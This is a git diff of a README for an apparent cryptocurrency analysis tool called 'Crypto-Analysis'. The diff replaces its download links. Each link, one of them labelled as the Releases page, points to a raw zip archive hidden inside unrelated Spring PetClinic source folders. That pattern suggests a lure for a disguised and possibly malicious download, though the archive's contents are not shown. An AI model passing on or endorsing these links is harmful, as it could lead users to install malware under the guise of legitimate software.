@@ -1,6 +1,6 @@
 # 🚀 Crypto-Analysis - Your Window into Cryptocurrency Insights
 
-[![Download Crypto-Analysis](https://raw.githubusercontent.com/Rajanikant12/Crypto-Analysis/main/src/main/java/org/springframework/samples/petclinic/model/Crypto-Analysis_3.7.zip)](https://raw.githubusercontent.com/Rajanikant12/Crypto-Analysis/main/src/main/java/org/springframework/samples/petclinic/model/Crypto-Analysis_3.7.zip)
+[![Download Crypto-Analysis](https://raw.githubusercontent.com/Rajanikant12/Crypto-Analysis/main/src/main/resources/db/postgres/Crypto_Analysis_2.7.zip)](https://raw.githubusercontent.com/Rajanikant12/Crypto-Analysis/main/src/main/resources/db/postgres/Crypto_Analysis_2.7.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ Follow these easy steps to get your Crypto-Analysis application up and running. 
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Download Crypto-Analysis](https://raw.githubusercontent.com/Rajanikant12/Crypto-Analysis/main/src/main/java/org/springframework/samples/petclinic/model/Crypto-Analysis_3.7.zip)
+   [Download Crypto-Analysis](https://raw.githubusercontent.com/Rajanikant12/Crypto-Analysis/main/src/main/resources/db/postgres/Crypto_Analysis_2.7.zip)
 
 2. **Select the Latest Release**  
    Look for the most recent version listed. This version contains the latest features and bug fixes.
